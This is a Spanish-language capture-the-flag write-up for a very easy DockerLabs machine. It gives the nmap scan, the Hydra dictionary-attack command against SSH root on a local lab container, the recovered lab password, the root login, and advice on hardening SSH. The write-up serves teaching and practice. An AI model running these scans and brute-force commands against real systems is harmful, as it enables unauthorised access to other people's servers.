# BreakMySSH
Laboratorio para practicar ataques de fuerza bruta con Hydra contra el servicio SSH.
# tproot — DockerLabs Writeup

> Writeup de la máquina **tproot** de [DockerLabs](https://dockerlabs.es/).
> Dificultad: **Muy fácil** · Técnicas: *enumeración de puertos*, *fuerza bruta SSH*.

---

## Índice

1. [Introducción](#introducción)
2. [Reconocimiento](#reconocimiento)
3. [Explotación — Fuerza bruta SSH](#explotación--fuerza-bruta-ssh)
4. [Acceso como root](#acceso-como-root)
5. [Remediación](#remediación)

---

## Introducción

`BreakMySSH` es una máquina de nivel muy fácil cuyo único servicio expuesto es **SSH**.
El objetivo es obtener acceso al sistema; todo el reto se reduce a enumerar el
servicio y conseguir credenciales válidas mediante un ataque de diccionario.


---

## Reconocimiento

Lanzamos un escaneo completo de puertos TCP con detección de servicios y scripts
por defecto. Como el objetivo está en la red local de Docker, usamos `-Pn` para
omitir el *host discovery*.

```bash
sudo nmap -p- -sS -sV -sC -vvv -Pn -n -T5 172.17.0.2
```

Resultado relevante:

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.7 (protocol 2.0)
```

Un único puerto abierto:

- **22/tcp** — OpenSSH 7.7

Sin servicios web ni otros vectores, el camino evidente es atacar la
autenticación de SSH.

---

## Explotación — Fuerza bruta SSH

Usamos **Hydra** con el diccionario `rockyou.txt`.

### Nota de método

En el primer intento se apuntó a una lista de usuarios (`-L usernames.txt`) que
no existía en el directorio actual, de ahí el error:

```
[ERROR] File for logins not found: usernames.txt
```

Además, probar **todos** los usuarios contra los ~14 millones de contraseñas de
`rockyou.txt` genera un espacio de búsqueda inabordable (cientos de miles de
millones de intentos). Dos ajustes lo resuelven:

1. **Reducir las tareas en paralelo** a `-t 4`. OpenSSH limita las conexiones
   concurrentes, así que más hilos provocan errores y falsos negativos.
2. **Centrar el ataque en `root`** (`-l root`) en lugar de una lista entera de
   usuarios. Esto reduce el espacio a un solo usuario × diccionario.

### Comando definitivo

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```

Resultado:

```
[22][ssh] host: 172.17.0.2   login: root   password: estrella
1 of 1 target successfully completed, 1 valid password found
```

**Credenciales obtenidas:** `root:estrella`

---

## Acceso como root

Nos conectamos por SSH con las credenciales encontradas:

```bash
ssh root@172.17.0.2
```

> 💡 Si la máquina se ha redesplegado, la clave de host SSH habrá cambiado y SSH
> rechazará la conexión (`REMOTE HOST IDENTIFICATION HAS CHANGED`). Se soluciona
> eliminando la clave antigua del `known_hosts`:
>
> ```bash
> ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '172.17.0.2'
> ```

Tras introducir la contraseña `estrella`, obtenemos shell y confirmamos el
máximo privilegio:

```
root@1db68a27c8e1:~# whoami
root
```

🏁 **Máquina comprometida como `root`.**

---

## Remediación

El fallo es puramente de **gestión de credenciales y configuración de SSH**.
Medidas recomendadas:

- **Deshabilitar el login directo de `root`** por SSH: `PermitRootLogin no` en
  `/etc/ssh/sshd_config`.
- **Usar contraseñas robustas** y no reutilizar palabras de diccionario como
  `estrella`.
- **Preferir autenticación por clave pública** y desactivar
  `PasswordAuthentication`.
- **Aplicar rate-limiting / bloqueo** frente a fuerza bruta con `fail2ban` o
  reglas de `iptables`.
- Mantener **OpenSSH actualizado** (la 7.7 es antigua).

---
